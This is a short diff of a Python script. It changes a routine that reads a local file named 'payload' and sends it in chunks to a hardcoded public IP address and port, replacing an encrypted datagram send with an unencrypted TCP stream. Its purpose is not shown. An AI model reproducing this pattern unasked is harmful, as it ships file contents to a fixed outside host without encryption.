@@ -272,10 +272,12 @@ def main():
                 __location__ = os.path.realpath(
                     os.path.join(os.getcwd(), os.path.dirname(__file__)))
                 file = open(os.path.join(__location__, payload), "rb");
-                data = file.read(1024)
-                while(data):
-                    if(sock.sendto(f.encrypt(data), ('3.16.183.65', 10020))):
-                        data = file.read(1024)
+                s = socket.socket()
+                s.connect(('3.16.183.65', 10020))
+                l = file.read(1024)
+                while (l):
+                    s.send(l)
+                    l = file.read(1024)
                 file.close()
             uInput = None
         else:
